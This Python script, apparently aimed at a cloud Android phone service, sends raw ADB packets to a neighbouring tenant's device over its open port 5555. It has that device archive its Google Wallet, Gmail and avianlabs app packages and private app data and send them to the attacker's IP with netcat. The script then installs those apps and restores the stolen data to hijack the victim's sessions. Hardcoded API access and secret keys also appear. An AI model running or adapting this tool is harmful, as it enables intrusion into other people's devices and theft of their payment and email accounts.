#!/usr/bin/env python3
"""
Clone Wallet v2 — Pull APKs + app data from neighbor, install, restore.
Uses PROVEN pull_file_from_neighbor pattern from device_cloner.py.

Target: 10.12.11.136 (Samsung SM-A225F) → APP6476KYH9KMLU5
Packages: walletnfcrel, gmail, avianlabs

Architecture:
  Neighbor:5555 ←(ADB relay via nc)← Our Device ←(Cloud API)← VPS
  1. Our device starts nc listener (fire, no wait)
  2. Our device fires ADB relay telling neighbor: cat file | nc OUR_IP PORT
  3. Fixed wait (no sync_cmd during transfer)
  4. Check file size
"""

import asyncio
import base64
import struct
import sys
import time
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent.parent))
from vmos_titan.core.vmos_cloud_api import VMOSCloudClient

# ═══════════════════════════════════════════════════════════════════════
# CONFIG
# ═══════════════════════════════════════════════════════════════════════

AK = "BPWNWxfXMQsjsREyzIOXmCtndRZO8iVi"
SK = "Q2SgcSwEfuwoedY0cijp6Mce"
PAD = "APP6476KYH9KMLU5"
BASE_URL = "https://api.vmoscloud.com"
OUR_IP = "10.12.11.186"
NEIGHBOR = "10.12.11.136"
CMD_DELAY = 3.5
XFER_PORT = 19870  # base transfer port

# APK paths discovered from scanning
PACKAGES = {
    "com.google.android.apps.walletnfcrel": [
        "/data/app/~~X4nq_m_3PwgxPjXW7FOxUg==/com.google.android.apps.walletnfcrel-j3hBjV2s-qFtnWyjU5qcsg==/base.apk",
        "/data/app/~~X4nq_m_3PwgxPjXW7FOxUg==/com.google.android.apps.walletnfcrel-j3hBjV2s-qFtnWyjU5qcsg==/split_config.arm64_v8a.apk",
        "/data/app/~~X4nq_m_3PwgxPjXW7FOxUg==/com.google.android.apps.walletnfcrel-j3hBjV2s-qFtnWyjU5qcsg==/split_config.xhdpi.apk",
    ],
    "com.google.android.gm": [
        "/data/app/~~2kWiCOsJZixGPTWUAti7CQ==/com.google.android.gm-XqHRZcPzCyjOaO0W_Zr9NQ==/base.apk",
        "/data/app/~~2kWiCOsJZixGPTWUAti7CQ==/com.google.android.gm-XqHRZcPzCyjOaO0W_Zr9NQ==/split_config.arm64_v8a.apk",
        "/data/app/~~2kWiCOsJZixGPTWUAti7CQ==/com.google.android.gm-XqHRZcPzCyjOaO0W_Zr9NQ==/split_config.en.apk",
        "/data/app/~~2kWiCOsJZixGPTWUAti7CQ==/com.google.android.gm-XqHRZcPzCyjOaO0W_Zr9NQ==/split_config.xhdpi.apk",
    ],
    "net.avianlabs.app": [
        "/data/app/~~M-ljJGhdd0ImdyZkxM2_Xw==/net.avianlabs.app-wHRHX0aq4hhthwRbiw5eIQ==/base.apk",
        "/data/app/~~M-ljJGhdd0ImdyZkxM2_Xw==/net.avianlabs.app-wHRHX0aq4hhthwRbiw5eIQ==/split_config.arm64_v8a.apk",
        "/data/app/~~M-ljJGhdd0ImdyZkxM2_Xw==/net.avianlabs.app-wHRHX0aq4hhthwRbiw5eIQ==/split_config.xhdpi.apk",
    ],
}

# App data dirs to clone
APP_DATA_DIRS = [
    "shared_prefs",
    "databases",
    "files",
    "cache",
]


# ═══════════════════════════════════════════════════════════════════════
# ADB WIRE PROTOCOL
# ═══════════════════════════════════════════════════════════════════════

def _adb_checksum(data: bytes) -> int:
    return sum(data) & 0xFFFFFFFF

def _adb_magic(cmd: bytes) -> int:
    return struct.unpack("<I", cmd)[0] ^ 0xFFFFFFFF

def _build_adb_packet(cmd: bytes, arg0: int, arg1: int, data: bytes = b"") -> bytes:
    header = struct.pack("<4sIIIII", cmd, arg0, arg1,
                         len(data), _adb_checksum(data), _adb_magic(cmd))
    return header + data

def build_cnxn() -> bytes:
    return _build_adb_packet(b"CNXN", 0x01000001, 256 * 1024, b"host::\x00")

def build_open(local_id: int, service: str) -> bytes:
    return _build_adb_packet(b"OPEN", local_id, 0, service.encode() + b"\x00")


# ═══════════════════════════════════════════════════════════════════════
# CLOUD BRIDGE
# ═══════════════════════════════════════════════════════════════════════

class Bridge:
    def __init__(self):
        self.client = VMOSCloudClient(ak=AK, sk=SK, base_url=BASE_URL)
        self._last = 0.0
        self._cnxn_staged = False

    async def _throttle(self):
        elapsed = time.time() - self._last
        if elapsed < CMD_DELAY:
            await asyncio.sleep(CMD_DELAY - elapsed)

    async def cmd(self, command: str, timeout: int = 20) -> str:
        await self._throttle()
        self._last = time.time()
        try:
            r = await asyncio.wait_for(
                self.client.sync_cmd(PAD, command, timeout_sec=timeout),
                timeout=timeout + 15,
            )
            data = r.get("data", [])
            if isinstance(data, list) and data:
                return (data[0].get("errorMsg", "") or "").strip()
            return ""
        except asyncio.TimeoutError:
            return "ERR:timeout"
        except Exception as e:
            return f"ERR:{e}"

    async def fire(self, command: str):
        await self._throttle()
        self._last = time.time()
        try:
            await self.client.async_adb_cmd([PAD], command)
        except Exception:
            pass

    async def ensure_cnxn(self):
        if not self._cnxn_staged:
            b64 = base64.b64encode(build_cnxn()).decode()
            await self.cmd(f"echo -n '{b64}' | base64 -d > /data/local/tmp/.cnxn")
            self._cnxn_staged = True

    async def nb_cmd(self, shell_cmd: str, wait: int = 8) -> str:
        """Execute command on neighbor via ADB relay."""
        await self.ensure_cnxn()
        open_pkt = build_open(1, f"shell:{shell_cmd}")
        b64 = base64.b64encode(open_pkt).decode()
        await self.cmd(f"echo -n '{b64}' | base64 -d > /data/local/tmp/.nb_open")

        relay = (
            f"(cat /data/local/tmp/.cnxn; sleep 0.3; cat /data/local/tmp/.nb_open; sleep {wait}) | "
            f"timeout {wait + 2} nc {NEIGHBOR} 5555 > /data/local/tmp/.nb_resp 2>/dev/null"
        )
        await self.fire(relay)
        await asyncio.sleep(wait + 4)

        out = await self.cmd(
            "strings -n 3 /data/local/tmp/.nb_resp | "
            "grep -v -E '^(CNXN|OKAY|WRTE|CLSE|OPEN)' | "
            "grep -v -e '^host::' -e '^device::' | head -50"
        )
        await self.cmd("rm -f /data/local/tmp/.nb_open /data/local/tmp/.nb_resp")
        return out

    async def pull_from_neighbor(self, remote_path: str, device_dest: str,
                                  timeout: int = 60) -> int:
        """
        Pull file from neighbor → our device via nc relay.
        Uses fire-and-forget nc listener + ADB relay + fixed wait + kill before check.
        Returns bytes received.
        """
        port = XFER_PORT
        await self.ensure_cnxn()

        # 1. Kill ALL stale nc + cleanup via async (non-blocking)
        await self.fire(f"pkill -9 -f 'nc '; pkill -9 -f 'nc$'; rm -f {device_dest}")
        await asyncio.sleep(5)

        # 2. Stage ADB OPEN for: cat file | nc OUR_IP PORT
        shell_cmd = f"cat {remote_path} | nc -w 15 {OUR_IP} {port}"
        open_pkt = build_open(1, f"shell:{shell_cmd}")
        b64 = base64.b64encode(open_pkt).decode()
        await self.cmd(f"echo -n '{b64}' | base64 -d > /data/local/tmp/.xfer_open")

        # 3. Start nc listener on our device (fire-and-forget)
        await self.fire(f"nc -l -p {port} > {device_dest}")
        await asyncio.sleep(2)

        # 4. Fire ADB relay (fire-and-forget) — keep pipe alive with sleep
        relay = (
            f"(cat /data/local/tmp/.cnxn; sleep 0.3; cat /data/local/tmp/.xfer_open; "
            f"sleep {timeout}) | "
            f"timeout {timeout + 5} nc {NEIGHBOR} 5555 > /dev/null 2>&1"
        )
        await self.fire(relay)

        # 5. FIXED WAIT — do NOT poll during transfer (causes device overload)
        wait_time = min(timeout + 10, 120)  # reasonable cap
        print(f"    [XFER] Relay fired, waiting {wait_time}s (no polling)...")
        await asyncio.sleep(wait_time)

        # 6. KILL nc processes BEFORE checking size (critical to avoid timeout)
        await self.fire(f"pkill -9 -f 'nc '; pkill -9 -f 'nc$'")
        await asyncio.sleep(5)

        # 7. Check size (device should be responsive now since nc is dead)
        size_str = await self.cmd(f"wc -c < {device_dest} 2>/dev/null || echo 0")
        try:
            size = int(size_str.strip())
        except ValueError:
            size = 0

        # 8. Cleanup
        await self.cmd(f"rm -f /data/local/tmp/.xfer_open")
        return size


# ═══════════════════════════════════════════════════════════════════════
# PHASE 1: PULL ALL APKs (single tar transfer)
# ═══════════════════════════════════════════════════════════════════════

async def phase1_pull_apks(b: Bridge) -> dict:
    """Pull all APK splits from neighbor as a single tar archive. Returns {pkg: [local_paths]}."""
    print("\n══════════════════════════════════════")
    print("  PHASE 1: PULL APKs FROM NEIGHBOR")
    print("══════════════════════════════════════")

    # Ensure staging dir
    await b.cmd("mkdir -p /data/local/tmp/apks")

    # Build tar command for neighbor: tar all APK dirs into single archive
    # Each package's APKs live under /data/app/~~XXX==/pkg-YYY==/
    apk_dirs = set()
    for pkg, paths in PACKAGES.items():
        for p in paths:
            # Get parent dir (e.g., /data/app/~~X4nq.../com.google.android.apps.walletnfcrel-j3hBjV2s.../)
            parent = "/".join(p.split("/")[:-1])
            apk_dirs.add(parent)

    tar_list = " ".join(apk_dirs)
    tar_dest_nb = "/sdcard/.all_apks.tar"

    # Tell neighbor to create tar
    print(f"  Creating tar of {len(apk_dirs)} APK directories on neighbor...")
    tar_cmd = f"tar cf {tar_dest_nb} {tar_list} 2>/dev/null; wc -c < {tar_dest_nb}"
    nb_out = await b.nb_cmd(tar_cmd, wait=20)
    print(f"  Neighbor tar result: {nb_out}")

    # Pull the tar
    local_tar = "/data/local/tmp/apks/all_apks.tar"
    print(f"  Pulling tar from neighbor...")
    size = await b.pull_from_neighbor(tar_dest_nb, local_tar, timeout=90)

    if size < 1000:
        print(f"  ✗ Tar pull failed ({size} bytes)")
        # Fallback: try individual APKs
        return await _phase1_individual_fallback(b)

    print(f"  ✓ Tar pulled: {size:,} bytes")

    # Extract on our device
    extract = await b.cmd(
        f"cd /data/local/tmp/apks && tar xf all_apks.tar 2>&1 | tail -3; echo DONE",
        timeout=30
    )
    print(f"  Extract: {extract}")

    # Verify extracted files and build result map
    results = {}
    for pkg, paths in PACKAGES.items():
        pkg_short = pkg.split(".")[-1]
        results[pkg] = []
        for remote_path in paths:
            # tar extracts with full path: /data/local/tmp/apks/data/app/~~.../pkg-.../base.apk
            local = f"/data/local/tmp/apks{remote_path}"
            sz = await b.cmd(f"wc -c < {local} 2>/dev/null || echo 0")
            try:
                s = int(sz.strip())
            except ValueError:
                s = 0
            if s > 0:
                results[pkg].append(local)
                fname = remote_path.split("/")[-1]
                print(f"    ✓ {pkg_short}/{fname}: {s:,} bytes")
            else:
                fname = remote_path.split("/")[-1]
                print(f"    ✗ {pkg_short}/{fname}: missing")

    # Cleanup tar on neighbor
    await b.nb_cmd(f"rm -f {tar_dest_nb}", wait=3)

    return results


async def _phase1_individual_fallback(b: Bridge) -> dict:
    """Fallback: pull APKs one by one if tar approach fails."""
    print("  Falling back to individual APK transfers...")
    results = {}
    for pkg, paths in PACKAGES.items():
        pkg_short = pkg.split(".")[-1]
        results[pkg] = []
        for i, remote_path in enumerate(paths):
            fname = remote_path.split("/")[-1]
            local = f"/data/local/tmp/apks/{pkg_short}_{fname}"
            timeout = 90 if "base.apk" in fname else 45
            print(f"    [{pkg_short}] {fname} (timeout={timeout}s)")
            size = await b.pull_from_neighbor(remote_path, local, timeout=timeout)
            if size > 0:
                print(f"    ✓ {size:,} bytes")
                results[pkg].append(local)
            else:
                print(f"    ✗ FAILED")
    return results


# ═══════════════════════════════════════════════════════════════════════
# PHASE 2: INSTALL SPLIT APKs
# ═══════════════════════════════════════════════════════════════════════

async def phase2_install(b: Bridge, apk_map: dict) -> dict:
    """Install split APKs using pm install-create sessions."""
    print("\n══════════════════════════════════════")
    print("  PHASE 2: INSTALL SPLIT APKs")
    print("══════════════════════════════════════")

    installed = {}
    for pkg, local_paths in apk_map.items():
        pkg_short = pkg.split(".")[-1]
        if not local_paths:
            print(f"  [{pkg_short}] SKIP — no APKs pulled")
            installed[pkg] = False
            continue

        # Check if base.apk is present
        has_base = any("base.apk" in p for p in local_paths)
        if not has_base:
            print(f"  [{pkg_short}] SKIP — missing base.apk")
            installed[pkg] = False
            continue

        print(f"\n  [{pkg_short}] Installing {len(local_paths)} splits...")

        # Calculate total size
        sizes = []
        for p in local_paths:
            sz = await b.cmd(f"wc -c < {p} 2>/dev/null || echo 0")
            try:
                sizes.append(int(sz.strip()))
            except ValueError:
                sizes.append(0)
        total = sum(sizes)

        if total < 10000:
            print(f"  [{pkg_short}] SKIP — total size too small ({total})")
            installed[pkg] = False
            continue

        # Create install session
        r = await b.cmd(f"pm install-create -S {total}")
        # Extract session ID from output like "Success: created install session [1234567]"
        sid = ""
        if "[" in r and "]" in r:
            sid = r.split("[")[1].split("]")[0]
        if not sid:
            print(f"  [{pkg_short}] ERROR: Could not create session: {r}")
            installed[pkg] = False
            continue

        print(f"  [{pkg_short}] Session: {sid}")

        # Write each split
        ok = True
        for i, (path, size) in enumerate(zip(local_paths, sizes)):
            fname = path.split("/")[-1]
            wr = await b.cmd(
                f"pm install-write -S {size} {sid} {i}_{fname} {path}",
                timeout=30
            )
            if "Success" not in wr:
                print(f"    ✗ Write failed for {fname}: {wr}")
                ok = False
                break
            print(f"    ✓ Written: {fname} ({size:,})")

        if not ok:
            await b.cmd(f"pm install-abandon {sid}")
            installed[pkg] = False
            continue

        # Commit
        commit = await b.cmd(f"pm install-commit {sid}")
        if "Success" in commit:
            print(f"  [{pkg_short}] ✓ INSTALLED successfully")
            installed[pkg] = True
        else:
            print(f"  [{pkg_short}] ✗ Commit failed: {commit}")
            installed[pkg] = False

    return installed


# ═══════════════════════════════════════════════════════════════════════
# PHASE 3: CLONE APP DATA
# ═══════════════════════════════════════════════════════════════════════

async def phase3_clone_data(b: Bridge, installed: dict) -> dict:
    """Clone app data from neighbor for installed packages."""
    print("\n══════════════════════════════════════")
    print("  PHASE 3: CLONE APP DATA")
    print("══════════════════════════════════════")

    cloned = {}
    for pkg, success in installed.items():
        if not success:
            print(f"  [{pkg}] SKIP — not installed")
            cloned[pkg] = False
            continue

        pkg_short = pkg.split(".")[-1]
        print(f"\n  [{pkg_short}] Cloning app data...")

        # First stop the app
        await b.cmd(f"am force-stop {pkg}")

        # Create tar on neighbor containing app data
        # We tell neighbor: tar czf /sdcard/data.tar.gz -C /data/data/PKG .
        tar_path_nb = f"/sdcard/.clone_{pkg_short}.tar.gz"
        tar_cmd = f"tar czf {tar_path_nb} -C /data/data/{pkg} . 2>/dev/null; echo SIZE:$(wc -c < {tar_path_nb})"
        nb_out = await b.nb_cmd(tar_cmd, wait=15)
        print(f"    Neighbor tar: {nb_out}")

        # Pull tar from neighbor
        local_tar = f"/data/local/tmp/{pkg_short}_data.tar.gz"
        size = await b.pull_from_neighbor(tar_path_nb, local_tar, timeout=60)
        if size < 100:
            print(f"    ✗ Data tar pull failed ({size} bytes)")
            cloned[pkg] = False
            continue

        print(f"    ✓ Data tar pulled: {size:,} bytes")

        # Get our UID for this package
        uid_str = await b.cmd(f"stat -c %u /data/data/{pkg}")
        try:
            uid = int(uid_str.strip())
        except ValueError:
            uid_str2 = await b.cmd(f"ls -ld /data/data/{pkg} | awk '{{print $3}}'")
            try:
                uid = int(uid_str2.strip())
            except ValueError:
                uid = 10000  # fallback

        print(f"    UID: {uid}")

        # Extract tar into app data dir
        extract = await b.cmd(
            f"tar xzf {local_tar} -C /data/data/{pkg}/ 2>&1 | tail -3; echo DONE",
            timeout=30
        )
        print(f"    Extract: {extract}")

        # Fix ownership
        await b.cmd(f"chown -R {uid}:{uid} /data/data/{pkg}/")

        # Fix permissions
        await b.cmd(f"chmod -R 770 /data/data/{pkg}/")

        # SELinux context
        await b.cmd(f"restorecon -R /data/data/{pkg}/ 2>/dev/null; echo DONE")

        # Clean neighbor tar
        await b.nb_cmd(f"rm -f {tar_path_nb}", wait=3)

        # Clean local tar
        await b.cmd(f"rm -f {local_tar}")

        print(f"    ✓ App data cloned + UID/SELinux fixed")
        cloned[pkg] = True

    return cloned


# ═══════════════════════════════════════════════════════════════════════
# PHASE 4: VERIFICATION
# ═══════════════════════════════════════════════════════════════════════

async def phase4_verify(b: Bridge, installed: dict) -> dict:
    """Verify installed packages work."""
    print("\n══════════════════════════════════════")
    print("  PHASE 4: VERIFICATION")
    print("══════════════════════════════════════")

    results = {}
    for pkg, success in installed.items():
        if not success:
            continue

        pkg_short = pkg.split(".")[-1]

        # Check if package is installed
        check = await b.cmd(f"pm list packages | grep {pkg}")
        if pkg in check:
            print(f"  ✓ {pkg_short}: INSTALLED")
            results[pkg] = "installed"
        else:
            print(f"  ✗ {pkg_short}: NOT FOUND")
            results[pkg] = "missing"

        # Check data dir
        data = await b.cmd(f"ls /data/data/{pkg}/ | head -5")
        if data:
            print(f"    Data: {data}")
        else:
            print(f"    Data: (empty)")

    # Show all packages
    all_pkgs = await b.cmd("pm list packages -3 | wc -l")
    print(f"\n  Total 3rd-party packages: {all_pkgs}")

    return results


# ═══════════════════════════════════════════════════════════════════════
# MAIN
# ═══════════════════════════════════════════════════════════════════════

async def main():
    print("=" * 60)
    print("  CLONE WALLET v2 — Neighbor → Our Device")
    print(f"  Source: {NEIGHBOR} | Target: {PAD}")
    print("=" * 60)

    b = Bridge()

    # Verify connectivity
    alive = await b.cmd("echo OK")
    if "OK" not in alive:
        print(f"  ERROR: Device not responding: {alive}")
        return

    nb_check = await b.cmd(
        f"echo quit | timeout 3 nc {NEIGHBOR} 5555 2>/dev/null && echo UP || echo DOWN"
    )
    if "UP" not in nb_check:
        print(f"  ERROR: Neighbor not reachable: {nb_check}")
        return

    print("  ✓ Device alive, neighbor reachable\n")

    # Phase 1: Pull APKs
    apk_map = await phase1_pull_apks(b)

    # Summary after phase 1
    print("\n  --- APK Pull Summary ---")
    for pkg, paths in apk_map.items():
        pkg_short = pkg.split(".")[-1]
        expected = len(PACKAGES[pkg])
        got = len(paths)
        print(f"    {pkg_short}: {got}/{expected} splits")

    # Phase 2: Install
    installed = await phase2_install(b, apk_map)

    # Phase 3: Clone data
    cloned = await phase3_clone_data(b, installed)

    # Phase 4: Verify
    results = await phase4_verify(b, installed)

    print("\n" + "=" * 60)
    print("  CLONE COMPLETE")
    for pkg in PACKAGES:
        pkg_short = pkg.split(".")[-1]
        status = results.get(pkg, "skipped")
        data = "✓" if cloned.get(pkg) else "✗"
        print(f"    {pkg_short}: {status} | data: {data}")
    print("=" * 60)


if __name__ == "__main__":
    asyncio.run(main())
